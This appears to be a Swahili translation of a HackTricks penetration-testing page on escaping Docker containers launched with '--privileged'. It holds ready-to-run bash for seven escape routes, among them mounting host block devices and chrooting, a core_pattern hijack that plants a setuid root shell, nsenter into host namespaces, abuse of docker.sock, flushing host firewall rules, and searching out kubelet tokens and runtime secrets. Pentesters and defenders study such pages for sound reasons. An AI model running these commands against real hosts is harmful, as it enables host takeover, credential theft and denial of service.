# Kutoroka kutoka kwa `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Container iliyozinduliwa kwa `--privileged` si sawa na container ya kawaida yenye ruhusa moja au mbili za ziada. Kivitendo, `--privileged` huondoa au hupunguza nguvu za ulinzi kadhaa za default za runtime ambazo kawaida huzuia workload kutoka kwa host resources hatari. Athari halisi bado inategemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:

- all capabilities zinatolewa
- device cgroup restrictions zinaondolewa
- many kernel filesystems huacha ku Mount kama read-only
- default masked procfs paths zinaondoka
- seccomp filtering imezimwa
- AppArmor confinement imezimwa
- SELinux isolation imezimwa au imebadilishwa na label pana zaidi

Madhara muhimu ni kwamba privileged container kawaida haina haja ya kernel exploit nyeti. Katika kesi nyingi inaweza kwa urahisi kuingiliana na host devices, host-facing kernel filesystems, au runtime interfaces moja kwa moja kisha pivot kwenda kwenye host shell.

## Mambo Ambayo `--privileged` Haibadilishi Kiotomatiki

`--privileged` haiji kiotomatiki kuungana na host PID, network, IPC, au UTS namespaces. Privileged container bado inaweza kuwa na private namespaces. Hii inamaanisha baadhi ya escape chains zinahitaji masharti ya ziada kama:

- host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Masharti hayo mara nyingi ni rahisi kuyatimia katika misconfigurations halisi, lakini kimsingi ni tofauti na `--privileged` yenyewe.

## Njia za Kutoroka

### 1. Mount The Host Disk Through Exposed Devices

Privileged container kawaida inaona device nodes nyingi zaidi chini ya `/dev`. Ikiwa host block device inaonekana, njia rahisi zaidi ya kutoroka ni kui-mount kisha `chroot` ndani ya host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ikiwa root partition sio wazi, orodhesha mpangilio wa block kwanza:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ikiwa njia ya vitendo ni kuweka setuid helper katika mount ya mwenyeji inayoweza kuandikwa badala ya `chroot`, kumbuka kwamba si kila mfumo wa faili unaheshimu bit ya setuid. Ukaguzi wa haraka wa uwezo upande wa mwenyeji ni:
```bash
mount | grep -v "nosuid"
```
Hii ni muhimu kwa sababu njia zinazoweza kuandikwa chini ya `nosuid` filesystems hazivutia sana kwa workflows za jadi za "drop a setuid shell and execute it later".

The weakened protections being abused here are:

- full device exposure
- broad capabilities, especially `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Or Reuse A Host Bind Mount And `chroot`

Ikiwa host root filesystem tayari imechomekwa ndani ya container, au ikiwa container inaweza kuunda mounts muhimu kwa sababu ni privileged, shell ya host mara nyingi iko mbali kwa `chroot` moja tu:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa hakuna host root bind mount lakini host storage inafikika, tengeneza moja:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Njia hii inatumia vibaya:

- vikwazo vya mount vilivyolegea
- capabilities kamili
- ukosefu wa MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Tumia vibaya `/proc/sys` au `/sys` vinavyoweza kuandikwa

Moja ya matokeo makubwa ya `--privileged` ni kwamba ulinzi wa procfs na sysfs unakuwa dhaifu sana. Hii inaweza kufichua interfaces za kernel zinazolekezwa kwa host ambazo kwa kawaida zimefichwa au zimewekwa kama read-only.

Mfano wa kawaida ni `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Njia nyingine zenye thamani kubwa ni pamoja na:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Njia hii inatumia:

- kukosekana kwa masked paths
- kukosekana kwa read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Tumia Capabilities Kamili kwa Mount- au Namespace-Based Escape

Container iliyopatiwa ruhusa hupata capabilities ambazo kawaida huondolewa kwenye standard containers, ikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingine nyingi. Hii mara nyingi inatosha kubadilisha local foothold kuwa host escape mara tu surface nyingine ya wazi inapopo.

Mfano rahisi ni ku-mount filesystems za ziada na kutumia namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ikiwa host PID pia inashirikiwa, hatua inakuwa hata fupi zaidi:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Njia hii inatumia vibaya:

- seti ya chaguo-msingi ya privileged capabilities
- kushiriki PID ya host (hiari)

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Kutoroka Kupitia runtime sockets

Privileged container mara nyingi huishia kuwa na hali ya runtime ya host au sockets zinazoonekana. Ikiwa socket ya Docker, containerd, au CRI-O inapatikana, njia rahisi mara nyingi ni kutumia runtime API kuanzisha container ya pili yenye ufikiaji wa host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kwa containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Njia hii inatumia vibaya:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ondoa Athari za Pembeni za Kutengwa kwa Mtandao

`--privileged` yenyewe haiunganishi container katika host network namespace, lakini ikiwa container pia ina `--network=host` au upatikanaji mwingine wa mtandao wa host, stack nzima ya mtandao inaweza kubadilishwa:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Si kila wakati hii ni shell ya mwenyeji moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au upatikanaji wa loopback-only management services.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Kusoma Siri za Mwenyeji na Hali ya Runtime

Hata wakati kutoroka kwa shell safi sio mara moja, containers zilizo na ruhusa za juu mara nyingi zina upatikanaji wa kutosha wa kusoma siri za mwenyeji, kubelet state, runtime metadata, na mifumo ya faili ya containers jirani:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ikiwa `/var` ni host-mounted au runtime directories zinaonekana, hii inaweza kutosha kwa lateral movement au cloud/Kubernetes credential theft hata kabla host shell inapatikana.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Ukaguzi

Madhumuni ya amri zifuatazo ni kuthibitisha ni privileged-container escape families zipi zinazoweza kutumika mara moja.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Kile kinachovutia hapa:

- set kamili ya capabilities, hasa `CAP_SYS_ADMIN`
- uwazi wa proc/sys unaoweza kuandikwa
- vifaa vya host vinavyoonekana
- kukosa seccomp na MAC confinement
- runtime sockets au host root bind mounts

Moja kati ya hayo inaweza kutosha kwa post-exploitation. Kadhaa pamoja kwa kawaida zina maana container kimsingi iko amri moja au mbili tu mbali na host compromise.

## Kurasa Zinazohusiana

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
